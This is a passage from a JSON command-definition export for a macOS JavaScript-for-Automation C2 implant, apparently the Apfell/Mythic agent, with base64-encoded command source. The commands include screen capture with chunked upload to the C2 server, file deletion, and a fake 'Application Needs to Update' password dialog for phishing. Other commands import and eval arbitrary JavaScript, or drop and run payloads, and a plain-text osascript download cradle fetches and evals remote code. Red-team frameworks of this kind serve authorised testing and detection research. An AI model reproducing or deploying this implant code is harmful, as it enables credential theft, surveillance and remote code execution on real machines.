0dJbWFnZShjZ2ltYWdlKTsKICAgICAgICBsZXQgY2FwdHVyZSA9IGJpdG1hcGltYWdlcmVwLnJlcHJlc2VudGF0aW9uVXNpbmdUeXBlUHJvcGVydGllcygkLk5TQml0bWFwSW1hZ2VGaWxlVHlwZVBORywgUmVmKCkpOwogICAgICAgIGxldCBvZmZzZXQgPSAwOwogICAgICAgIGxldCBjaHVua1NpemUgPSAzNTAwMDA7CiAgICAgICAgbGV0IGZpbGVTaXplID0gcGFyc2VJbnQoY2FwdHVyZS5sZW5ndGgpOwogICAgICAgIC8vIGFsd2F5cyByb3VuZCB1cCB0byBhY2NvdW50IGZvciBjaHVua3MgdGhhdCBhcmUgPCBjaHVua3NpemU7CiAgICAgICAgbGV0IG51bU9mQ2h1bmtzID0gTWF0aC5jZWlsKGZpbGVTaXplIC8gY2h1bmtTaXplKTsKICAgICAgICBsZXQgcmVnaXN0ZXJEYXRhID0geyd0b3RhbF9jaHVua3MnOiBudW1PZkNodW5rcywgJ3Rhc2snOiB0YXNrLmlkfTsKICAgICAgICBsZXQgcmVnaXN0ZXJGaWxlID0gQzIucG9zdFJlc3BvbnNlKHRhc2ssIHJlZ2lzdGVyRGF0YSk7CiAgICAgICAgaWYgKHJlZ2lzdGVyRmlsZVsncmVzcG9uc2VzJ11bMF1bJ3N0YXR1cyddID09PSAic3VjY2VzcyIpewogICAgICAgICAgICBsZXQgY3VycmVudENodW5rID0gMTsKICAgICAgICAgICAgbGV0IGNzaXplID0gY2FwdHVyZS5sZW5ndGggLSBvZmZzZXQgPiBjaHVua1NpemUgPyBjaHVua1NpemUgOiBjYXB0dXJlLmxlbmd0aCAtIG9mZnNldDsKICAgICAgICAgICAgbGV0IGRhdGEgPSBjYXB0dXJlLnN1YmRhdGFXaXRoUmFuZ2UoJC5OU01ha2VSYW5nZShvZmZzZXQsIGNzaXplKSk7CiAgICAgICAgICAgIHdoaWxlKHBhcnNlSW50KGRhdGEubGVuZ3RoKSA+IDAgJiYgb2Zmc2V0IDwgZmlsZVNpemUpewogICAgICAgICAgICAgICAgLy8gc2VuZCBhIGNodW5rCiAgICAgICAgICAgICAgICBsZXQgZmlsZURhdGEgPSB7J2NodW5rX251bSc6IGN1cnJlbnRDaHVuaywgJ2NodW5rX2RhdGEnOiBkYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qcywgJ3Rhc2snOiB0YXNrLmlkLCAnZmlsZV9pZCc6IHJlZ2lzdGVyRmlsZVsncmVzcG9uc2VzJ11bMF1bJ2ZpbGVfaWQnXX07CiAgICAgICAgICAgICAgICBDMi5wb3N0UmVzcG9uc2UodGFzaywgZmlsZURhdGEpOwogICAgICAgICAgICAgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbChDMi5nZW5fc2xlZXBfdGltZSgpKTsKCiAgICAgICAgICAgICAgICAvLyBpbmNyZW1lbnQgdGhlIG9mZnNldCBhbmQgc2VlayB0byB0aGUgYW1vdW50IG9mIGRhdGEgcmVhZCBmcm9tIHRoZSBmaWxlCiAgICAgICAgICAgICAgICBvZmZzZXQgPSBvZmZzZXQgKyBwYXJzZUludChkYXRhLmxlbmd0aCk7CiAgICAgICAgICAgICAgICBjc2l6ZSA9IGNhcHR1cmUubGVuZ3RoIC0gb2Zmc2V0ID4gY2h1bmtTaXplID8gY2h1bmtTaXplIDogY2FwdHVyZS5sZW5ndGggLSBvZmZzZXQ7CiAgICAgICAgICAgICAgICBkYXRhID0gY2FwdHVyZS5zdWJkYXRhV2l0aFJhbmdlKCQuTlNNYWtlUmFuZ2Uob2Zmc2V0LCBjc2l6ZSkpOwogICAgICAgICAgICAgICAgY3VycmVudENodW5rICs9IDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOkpTT04uc3RyaW5naWZ5KHsiZmlsZV9pZCI6IHJlZ2lzdGVyRmlsZVsncmVzcG9uc2VzJ11bMF1bJ2ZpbGVfaWQnXX0pLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiRmFpbGVkIHRvIHJlZ2lzdGVyIGZpbGUgdG8gZG93bmxvYWQiLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJGYWlsZWQgdG8gZ2V0IGEgc2NyZWVuY2FwdHVyZTogIiArIGVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKICBpZihyZXNwb25zZXMubGVuZ3RoID09IDIpewogICAgdHJ5ewogICAgICAgIGxldCBzdGF0dXMgPSBKU09OLnBhcnNlKHJlc3BvbnNlc1sxXVsncmVzcG9uc2UnXSk7CiAgICAJbGV0IGlkID0gc3RhdHVzWydmaWxlX2lkJ107CiAgICAgICAgbGV0IG91dHB1dCA9ICI8ZGl2IGNsYXNzPSdjYXJkJz48ZGl2IGNsYXNzPSdjYXJkLWhlYWRlciBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz48YSBjbGFzcz0nYnRuIHN0cmV0Y2hlZC1saW5rJyB0eXBlPSdidXR0b24nIGRhdGEtdG9nZ2xlPSdjb2xsYXBzZScgZGF0YS10YXJnZXQ9JyN0YXNrIiArIHRhc2tbJ2lkJ10gKyAic2NyZWVuY2FwdHVyZScgYXJpYS1leHBhbmRlZD0nZmFsc2UnIGFyaWEtY29udHJvbHM9J3Rhc2siICsgdGFza1snaWQnXSArICJzY3JlZW5jYXB0dXJlJz5GaW5pc2hlZCA8Zm9udCBjb2xvcj0ncmVkJz5TY3JlZW5jYXB0dXJlICIgKyB0YXNrWydwYXJhbXMnXSArICI8L2ZvbnQ+LiBDbGljayB0byB2aWV3PC9kaXY+IjsKICAgICAgb3V0cHV0ICs9ICI8ZGl2IGNsYXNzPSdjb2xsYXBzZScgaWQ9XCJ0YXNrIiArIHRhc2tbJ2lkJ10gKyAic2NyZWVuY2FwdHVyZVwiIHN0eWxlPSd3aWR0aDoxMDAlJz4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J3Jlc3BvbnNlLWJhY2tncm91bmQgY2FyZC1ib2R5Jz48aW1nIHNyYz0nL2FwaS92MS40L2ZpbGVzL3NjcmVlbmNhcHR1cmVzLyIgKyBpZCArICInIHdpZHRoPScxMDAlJz48L2Rpdj48L2Rpdj48L2Rpdj4iOwoJCSAgICAgIHJldHVybiBvdXRwdXQ7CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgcmV0dXJuICI8cHJlPkVycm9yOiAiICsgZXJyb3IudG9TdHJpbmcoKSArICJcbiIgKyBKU09OLnN0cmluZ2lmeShyZXNwb25zZXMsIG51bGwsIDIpICsgIjwvcHJlPiI7CiAgICB9CiAgfWlmKHRhc2suc3RhdHVzID09PSAncHJvY2Vzc2luZycpewogIAlyZXR1cm4gIjxwcmU+IGRvd25sb2FkaW5nIHBpZWNlcyAuLi48L3ByZT4iOwogIH1pZih0YXNrLnN0YXR1cyA9PT0gJ2Vycm9yJyl7CiAgCXJldHVybiAiPHByZT4gRXJyb3I6IFVudG9nZ2xlIHN3dGljaCB0byBzZWUgZXJyb3IgbWVzc2FnZShzKSA8L3ByZT4iOwogIH0KICAKfQ=="
        },
        {
          "needs_admin": false,
          "help_cmd": "rm [path]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Remove a file, no quotes are necessary and relative paths are fine",
          "cmd": "rm",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "path"
            }
          ],
          "attack": [
            {
              "t_num": "T1106",
              "attack_name": "Execution through API"
            },
            {
              "t_num": "T1107",
              "attack_name": "File Deletion"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "rm.js": "ZXhwb3J0cy5ybSA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbW1hbmRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIGxldCBwYXRoID0gY29tbWFuZF9wYXJhbXNbJ3BhdGgnXTsKICAgICAgICBsZXQgZmlsZU1hbmFnZXIgPSAkLk5TRmlsZU1hbmFnZXIuZGVmYXVsdE1hbmFnZXI7CiAgICAgICAgaWYocGF0aFswXSA9PT0gJyInKXsKICAgICAgICAgICAgcGF0aCA9IHBhdGguc3Vic3RyaW5nKDEsIHBhdGgubGVuZ3RoLTEpOwogICAgICAgIH0KICAgICAgICBsZXQgZXJyb3IgPSBSZWYoKTsKICAgICAgICBmaWxlTWFuYWdlci5yZW1vdmVJdGVtQXRQYXRoRXJyb3IoJChwYXRoKSwgZXJyb3IpOwogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiUmVtb3ZlZCBmaWxlIiwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "path",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "rm",
              "command_id": 28,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "prompt",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Create a custom prompt to ask the user for credentials where you can provide titles, icons, text and default answer. The buttons will be \"OK\" and \"Cancel\"",
          "cmd": "prompt",
          "parameters": [
            {
              "type": "String",
              "hint": "Title of the dialog box",
              "choices": "",
              "required": false,
              "name": "title"
            },
            {
              "type": "String",
              "hint": "full path to .icns file to use",
              "choices": "",
              "required": false,
              "name": "icon"
            },
            {
              "type": "String",
              "hint": "Additional descriptive text to display",
              "choices": "",
              "required": false,
              "name": "text"
            },
            {
              "type": "String",
              "hint": "Default answer to pre-populate (will show up as *****)",
              "choices": "",
              "required": false,
              "name": "answer"
            }
          ],
          "attack": [
            {
              "t_num": "T1141",
              "attack_name": "Input Prompt"
            }
          ],
          "artifacts": [
            {
              "command_parameter": "null",
              "artifact": "Process Create",
              "artifact_string": "CVMServer wrote file \/private\/var\/db\/CVMS\/cvmsCodeSignObj[somes_string]",
              "replace_string": "*"
            },
            {
              "command_parameter": "null",
              "artifact": "Process Create",
              "artifact_string": "osascript loaded dylib \/private\/var\/db\/CVMS\/cvmsCodeSignObj[somes_string]",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "prompt.js": "ZXhwb3J0cy5wcm9tcHQgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgbGV0IGNvbmZpZyA9IFtdOwoJaWYocGFyYW1zLmxlbmd0aCA+IDApe2NvbmZpZyA9IEpTT04ucGFyc2UocGFyYW1zKTt9CgllbHNle2NvbmZpZyA9IFtdO30KCWxldCB0aXRsZSA9ICJBcHBsaWNhdGlvbiBOZWVkcyB0byBVcGRhdGUiOwoJaWYoY29uZmlnLmhhc093blByb3BlcnR5KCJ0aXRsZSIpICYmIGNvbmZpZ1sndGl0bGUnXSAhPT0gIiIpe3RpdGxlID0gY29uZmlnWyd0aXRsZSddO30KCWxldCBpY29uID0gIi9TeXN0ZW0vTGlicmFyeS9Db3JlU2VydmljZXMvU29mdHdhcmUgVXBkYXRlLmFwcC9Db250ZW50cy9SZXNvdXJjZXMvU29mdHdhcmVVcGRhdGUuaWNucyI7CglpZihjb25maWcuaGFzT3duUHJvcGVydHkoImljb24iKSAmJiBjb25maWdbJ2ljb24nXSAhPT0gIiIpe2ljb24gPSBjb25maWdbJ2ljb24nXTt9CglsZXQgdGV4dCA9ICJBbiBhcHBsaWNhdGlvbiBuZWVkcyBwZXJtaXNzaW9uIHRvIHVwZGF0ZSI7CglpZihjb25maWcuaGFzT3duUHJvcGVydHkoInRleHQiKSAmJiBjb25maWdbJ3RleHQnXSAhPT0gIiIpe3RleHQgPSBjb25maWdbJ3RleHQnXTt9CglsZXQgYW5zd2VyID0gIiI7CglpZihjb25maWcuaGFzT3duUHJvcGVydHkoImFuc3dlciIpICYmIGNvbmZpZ1snYW5zd2VyJ10gIT09ICIiKXthbnN3ZXIgPSBjb25maWdbJ2Fuc3dlciddO30KCXRyeXsKCQlsZXQgcHJvbXB0ID0gY3VycmVudEFwcC5kaXNwbGF5RGlhbG9nKHRleHQsIHsKCQkJZGVmYXVsdEFuc3dlcjogYW5zd2VyLAoJCQlidXR0b25zOiBbJ09LJywgJ0NhbmNlbCddLCAKCQkJZGVmYXVsdEJ1dHRvbjogJ09LJywKCQkJY2FuY2VsQnV0dG9uOiAnQ2FuY2VsJywgCgkJCXdpdGhUaXRsZTogdGl0bGUsICAKCQkJd2l0aEljb246IFBhdGgoaWNvbiksCgkJCWhpZGRlbkFuc3dlcjogdHJ1ZSAKCQl9KTsKCQlyZXR1cm4geyJ1c2VyX291dHB1dCI6cHJvbXB0LnRleHRSZXR1cm5lZCwgImNvbXBsZXRlZCI6IHRydWV9OwoJfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "jsimport_call [function name]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "call a function from within the JS file that was imported with \"jsimport\". This function call is appended to the end of the jsimport code and called via eval.",
          "cmd": "jsimport_call",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "command"
            }
          ],
          "attack": [
            {
              "t_num": "T1155",
              "attack_name": "AppleScript"
            },
            {
              "t_num": "T1064",
              "attack_name": "Scripting"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "jsimport_call.js": "ZXhwb3J0cy5qc2ltcG9ydF9jYWxsID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIHRyeXsKICAgICAgICBsZXQgY29tbWFuZF9wYXJhbXMgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgaWYoIWNvbW1hbmRfcGFyYW1zLmhhc093blByb3BlcnR5KCdjb21tYW5kJykpeyByZXR1cm4geyJ1c2VyX291dHB1dCI6ICJtaXNzaW5nIGNvbW1hbmQgcGFyYW1ldGVyIiwgInN0YXR1cyI6ICJlcnJvciIsICJjb21wbGV0ZWQiOiB0cnVlfTt9CiAgICAgICAgbGV0IG91dHB1dCA9IE9iakMuZGVlcFVud3JhcChldmFsKGpzaW1wb3J0ICsgIlxuICIgKyBjb21tYW5kX3BhcmFtc1snY29tbWFuZCddKSk7CiAgICAgICAgaWYob3V0cHV0ID09PSAiIiB8fCBvdXRwdXQgPT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiTm8gY29tbWFuZCBvdXRwdXQiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfQogICAgICAgIGlmKG91dHB1dCA9PT0gdHJ1ZSl7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiVHJ1ZSIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgaWYob3V0cHV0ID09PSBmYWxzZSl7CiAgICAgICAgICAgIHJldHVybnsidXNlcl9vdXRwdXQiOiJGYWxzZSIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgaWYodHlwZW9mKG91dHB1dCkgIT0gInN0cmluZyIpewogICAgICAgICAgICBvdXRwdXQgPSBTdHJpbmcob3V0cHV0KTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOm91dHB1dCwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgfQogICAgY2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "command",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "jsimport_call",
              "command_id": 30,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "jsimport (then select the file to upload)",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "import a JS file into memory. Only one can be imported at a time.",
          "cmd": "jsimport",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "file"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "jsimport.js": "ZXhwb3J0cy5qc2ltcG9ydCA9IGZ1bmN0aW9uKHRhc2ssY29tbWFuZCxwYXJhbXMpewogICAgbGV0IHNjcmlwdCA9ICIiOwogICAgdHJ5ewogICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCJmaWxlIikpewogICAgICAgICAgICBsZXQgc2NyaXB0X2RhdGEgPSBDMi51cGxvYWQodGFzaywgY29uZmlnWydmaWxlJ10pOwogICAgICAgICAgICBpZih0eXBlb2Ygc2NyaXB0X2RhdGEgPT09ICJzdHJpbmciKXsKICAgICAgICAgICAgICAgIHJldHVybnsidXNlcl9vdXRwdXQiOiJGYWlsZWQgdG8gZ2V0IGNvbnRlbnRzIG9mIGZpbGUiLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgICAgICB9CiAgICAgICAgICAgIHNjcmlwdCA9IE9iakMudW53cmFwKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2Rpbmcoc2NyaXB0X2RhdGEsICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpKTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJOZWVkIHRvIHN1cHBseSBhIHZhbGlkIGZpbGUgdG8gZG93bmxvYWQiLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgICAgICBqc2ltcG9ydCA9IHNjcmlwdDsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6IkltcG9ydGVkIHRoZSBzY3JpcHQiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICB9CiAgICBjYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "spawn_download_cradle {\"url\": \"https:\/\/mydomain.com\/payload\"}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Spawn a new osascript download cradle  as a backgrounded process to launch a new callback",
          "cmd": "spawn_download_cradle",
          "parameters": [
            {
              "type": "String",
              "hint": "full URL of hosted payload",
              "choices": "",
              "required": true,
              "name": "url"
            }
          ],
          "attack": [],
          "artifacts": [
            {
              "command_parameter": "url",
              "artifact": "Process Create",
              "artifact_string": "\/usr\/bin\/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('*')),$.NSUTF8StringEncoding)));\"",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "spawn_download_cradle.js": "ZXhwb3J0cy5zcGF3bl9kb3dubG9hZF9jcmFkbGUgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgdHJ5ewogICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgLy9mdWxsX3VybCA9IEMyLmJhc2V1cmwgKyAiYXBpL3YxLjAvcGF5bG9hZHMvZ2V0LyIgKyBzcGxpdF9wYXJhbXNbM107CiAgICAgICAgaWYoIWNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgndXJsJykpe3JldHVybiB7InVzZXJfb3V0cHV0IjogIm1pc3NpbmcgdXJsIHBhcmFtZXRlcjogJ2EgVVJMIGFkZHJlc3Mgd2hlcmUgdGhlIGp4YSBjb2RlIGlzIGhvc3RlZCciLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9O30KICAgICAgICBsZXQgZnVsbF91cmwgPSBjb25maWdbJ3VybCddOwogICAgICAgIGxldCBwYXRoID0gIi91c3IvYmluL29zYXNjcmlwdCI7CiAgICAgICAgbGV0IGFyZ3MgPSBbJy1sJywnSmF2YVNjcmlwdCcsJy1lJ107CiAgICAgICAgbGV0IGNvbW1hbmQgPSAiZXZhbChPYmpDLnVud3JhcCgkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoRGF0YUVuY29kaW5nKCQuTlNEYXRhLmRhdGFXaXRoQ29udGVudHNPZlVSTCgkLk5TVVJMLlVSTFdpdGhTdHJpbmcoIjsKICAgICAgICBjb21tYW5kID0gY29tbWFuZCArICInIiArIGZ1bGxfdXJsICsgIicpKSwkLk5TVVRGOFN0cmluZ0VuY29kaW5nKSkpOyI7CiAgICAgICAgYXJncy5wdXNoKGNvbW1hbmQpOwogICAgICAgIGFyZ3MucHVzaCgiJiIpOwogICAgICAgIHRyeXsKICAgICAgICAgICAgbGV0IHBpcGUgPSAkLk5TUGlwZS5waXBlOwogICAgICAgICAgICBsZXQgZmlsZSA9IHBpcGUuZmlsZUhhbmRsZUZvclJlYWRpbmc7ICAvLyBOU0ZpbGVIYW5kbGUKICAgICAgICAgICAgbGV0IHRhc2sgPSAkLk5TVGFzay5hbGxvYy5pbml0OwogICAgICAgICAgICB0YXNrLmxhdW5jaFBhdGggPSBwYXRoOwogICAgICAgICAgICB0YXNrLmFyZ3VtZW50cyA9IGFyZ3M7CiAgICAgICAgICAgIHRhc2suc3RhbmRhcmRPdXRwdXQgPSBwaXBlOwogICAgICAgICAgICB0YXNrLnN0YW5kYXJkRXJyb3IgPSBwaXBlOwogICAgICAgICAgICB0YXNrLmxhdW5jaDsKICAgICAgICB9CiAgICAgICAgY2F0Y2goZXJyb3IpewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJQcm9jZXNzIHNwYXduZWQiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "spawn_drop_and_execute",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": true,
          "author": "",
          "deleted": false,
          "description": "Generate a new payload, drop it to a temp location, execute it with osascript as a background process, and then delete the file. Automatically reports back the temp file it created",
          "cmd": "spawn_drop_and_execute",
          "parameters": [
            {
              "type": "PayloadList",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "template"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "spawn_drop_and_execute.js": "ZXhwb3J0cy5zcGF3bl9kcm9wX2FuZF9leGVjdXRlID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIGxldCBhcnRpZmFjdHMgPSBbXTsKICAgIHRyeXsKICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIC8vZnVsbF91cmwgPSBDMi5iYXNldXJsICsgImFwaS92MS4wL3BheWxvYWRzL2dldC8iICsgc3BsaXRfcGFyYW1zWzNdOwogICAgICAgIGxldCBtID0gWy4uLkFycmF5KE51bWJlcigxMCkpXS5tYXAoaT0+KH5+KE1hdGgucmFuZG9tKCkqMzYpKS50b1N0cmluZygzNikpLmpvaW4oJycpOwogICAgICAgIGxldCB0ZW1wX2ZpbGUgPSAiL3RtcC8iICsgbTsKICAgICAgICBsZXQgZmlsZSA9IEMyLnVwbG9hZCh0YXNrLCBjb25maWdbJ3RlbXBsYXRlJ10sIHRlbXBfZmlsZSk7CgogICAgICAgIGxldCBwYXRoID0gIi91c3IvYmluL29zYXNjcmlwdCI7CiAgICAgICAgbGV0IHJlc3VsdCA9IHdyaXRlX2RhdGFfdG9fZmlsZShmaWxlLCB0ZW1wX2ZpbGUpOwogICAgICAgIGlmKHJlc3VsdCAhPT0gImZpbGUgd3JpdHRlbiIpe3JldHVybiB7InVzZXJfb3V0cHV0IjogcmVzdWx0LCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICdlcnJvcid9O30KICAgICAgICBlbHNle2FydGlmYWN0cy5wdXNoKHsiYmFzZV9hcnRpZmFjdCI6ICJGaWxlIFdyaXRlIiwgImFydGlmYWN0IjogdGVtcF9maWxlfSk7fQogICAgICAgIGxldCBhcmdzID0gWyctbCcsJ0phdmFTY3JpcHQnLCB0ZW1wX2ZpbGUsICcmJ107CiAgICAgICAgdHJ5ewogICAgICAgICAgICBsZXQgcGlwZSA9ICQuTlNQaXBlLnBpcGU7CiAgICAgICAgICAgIGxldCBmaWxlID0gcGlwZS5maWxlSGFuZGxlRm9yUmVhZGluZzsgIC8vIE5TRmlsZUhhbmRsZQogICAgICAgICAgICBsZXQgdGFzayA9ICQuTlNUYXNrLmFsbG9jLmluaXQ7CiAgICAgICAgICAgIHRhc2subGF1bmNoUGF0aCA9IHBhdGg7CiAgICAgICAgICAgIHRhc2suYXJndW1lbnRzID0gYXJnczsKICAgICAgICAgICAgdGFzay5zdGFuZGFyZE91dHB1dCA9IHBpcGU7CiAgICAgICAgICAgIHRhc2suc3RhbmRhcmRFcnJvciA9IHBpcGU7CiAgICAgICAgICAgIHRhc2subGF1bmNoOwogICAgICAgICAgICBhcnRpZmFjdHMucHVzaCh7ImJhc2VfYXJ0aWZhY3QiOiAiUHJvY2VzcyBDcmVhdGUiLCAiYXJ0aWZhY3QiOiAiL3Vzci9iaW4vb3Nhc2NyaXB0ICIgKyBhcmdzLmpvaW4oIiAiKX0pOwogICAgICAgIH0KICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciIsICJhcnRpZmFjdHMiOiBhcnRpZmFjdHN9OwogICAgICAgIH0KICAgICAgICAvL2dpdmUgdGhlIHN5c3RlbSB0aW1lIHRvIGFjdHVhbGx5IGV4ZWN1dGUgdGhlIGZpbGUgYmVmb3JlIHdlIGRlbGV0ZSB